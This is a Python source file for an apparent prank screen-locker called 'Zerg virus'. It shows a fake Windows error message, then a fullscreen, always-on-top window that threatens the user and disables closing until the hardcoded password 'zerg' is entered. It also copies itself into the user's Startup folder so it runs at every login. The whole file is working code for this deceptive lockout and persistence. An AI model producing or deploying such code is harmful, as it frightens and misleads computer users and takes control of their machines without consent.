import getpass
import os
import os.path
from pathlib import Path
import shutil
import sys
import tkinter as tk
from tkinter import messagebox
import threading
import time
from tkinter import ttk
from PIL import Image, ImageTk

USER_NAME = getpass.getuser()

class FakeErrorApp:
    def __init__(self):
        self.root = None
        self.error_window = None
        self.main_window = None

    def _set_icon(self):
        icon_path = None
        
        if getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS'):
            base_path = sys._MEIPASS
            icon_path = os.path.join(base_path, 'icon.ico')
        else:
            icon_path = 'icon.ico'
        
        try:
            self.root.iconbitmap(icon_path)
        except:
            try:
                self.root.iconbitmap(default='@error')
            except:
                pass
        
    def start(self):
        """Start app"""
        self.root = tk.Tk()
        self.root.withdraw()
        self._set_icon()
        
        self.start_timer()
        
        self.create_error_window_simple()
        
        self.root.mainloop()
    
    def start_timer(self):
        """Start timer in another Thread"""
        timer_thread = threading.Thread(target=self.wait_and_open_main)
        timer_thread.daemon = True
        timer_thread.start()
    
    def wait_and_open_main(self):
        """Waiting for the end of timer and create the main_window"""
        time.sleep(2)
        self.root.after(0, self.create_main_window)
    
    def create_error_window_simple(self):
        """Error wndow"""
        def show_error():
            temp_root = tk.Tk()
            temp_root.withdraw()
            
            messagebox.showerror("Системная ошибка", 
                               "Ошибка: 0x80070002\nНе удается найти указанный файл.\n"
                               "Система Windows не может найти указанный файл.")
            
            temp_root.destroy()
        
        error_thread = threading.Thread(target=show_error)
        error_thread.daemon = True
        error_thread.start()
    
    def create_main_window(self):
        """Cretate main window"""

        def add_to_startup():
            startup_folder = Path(os.path.expanduser('~')) / 'AppData' / 'Roaming' / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
            
            if getattr(sys, 'frozen', False):
                current_file = sys.executable
            else:
                current_file = sys.argv[0]
            
            target_path = startup_folder / os.path.basename(current_file)
            
            if not target_path.exists():
                shutil.copy2(current_file, target_path)
                return True
            else:
                return False

        def block():
            self.main_window.protocol("WM_DELETE_WINDOW",block)
            self.main_window.update()

        def clicked():
            res = format(txt.get())
            if res == 'zerg':
                if self.main_window:
                    self.main_window.destroy()
                if self.root:
                    self.root.destroy()
                os._exit(0)

        if self.error_window:
            try:
                self.error_window.destroy()
            except:
                pass
        
        self.main_window = tk.Toplevel(self.root)
        self.main_window.title("")
        self.main_window.title("Ошибка Windows")
        self.main_window.configure(bg="black")
        
        self.main_window.attributes('-fullscreen', True)
        self.main_window.attributes('-topmost', True)

        normal_width = 1920
        normal_height = 1080

        screen_width = self.main_window.winfo_screenwidth()
        screen_height = self.main_window.winfo_screenheight()

        percentage_width = screen_width / (normal_width / 100)
        percentage_height = screen_height / (normal_height / 100)

        scale_factor = ((percentage_width + percentage_height) / 2) / 100

        fontsize = int(20 * scale_factor)
        minimum_size = 10
        if fontsize < minimum_size:
            fontsize = minimum_size

        fontsizeHding = int(72 * scale_factor)
        minimum_size = 40
        if fontsizeHding < minimum_size:
            fontsizeHding = minimum_size

        self.main_window.update() 

        try:
            if getattr(sys, 'frozen', False):
                base_path = sys._MEIPASS
                bg_path = os.path.join(base_path, 'background.jpg')
            else:
                bg_path = 'background.jpg'
            
            pil_image = Image.open(bg_path)
            
            pil_image = pil_image.resize((screen_width, screen_height), Image.Resampling.LANCZOS)
            
            bg_image = ImageTk.PhotoImage(pil_image)
            
            bg_label = tk.Label(self.main_window, image=bg_image)
            bg_label.image = bg_image
            bg_label.place(x=0, y=0, relwidth=1, relheight=1)
            
            
        except Exception as e:
            bg_color = tk.Label(self.main_window, bg='darkred')
            bg_color.place(x=0, y=0, relwidth=1, relheight=1)

        self.default_style = ttk.Style()
        self.default_style.configure('New.TButton', font=("Helvetica", fontsize))

        txt_one = tk.Label(self.main_window, text='Zerg virus', font=("Arial Bold", fontsizeHding), fg='red', bg='black')
        txt_three = tk.Label(self.main_window, text='We are the swarm. You will become part of the swarm - your computer will be completely subordinated to the collective mind if you do not enter the password.', 
                             font=("Arial Bold", fontsize), fg='white', bg='black')

        txt_one.grid(column=0, row=0)
        txt_three.grid(column=0, row=0)

        txt_one.place(relx=0.5, rely=0.1, anchor='center')
        txt_three.place(relx=0.5, rely=0.3, anchor='center')

        txt = tk.Entry(self.main_window )  
        btn = tk.Button(self.main_window , text="ENTER", command=clicked)  
        txt.place(relx=0.5, rely=0.7, anchor='center', relwidth=.3, relheight=.06)
        btn.place(relx=0.5, rely=0.8, anchor='center', relwidth=.1, relheight=.06)

        # self.main_window.bind('<Escape>', lambda e: self.exit_app())
        # self.main_window.bind('<Button-1>', lambda e: self.exit_app())

        add_to_startup()
        block()
        
        self.main_window.focus_force()
    
    def exit_app(self):
        if self.main_window:
            self.main_window.destroy()
        if self.root:
            self.root.quit()

def main():
    app = FakeErrorApp()
    app.start()

if __name__ == "__main__":
    main()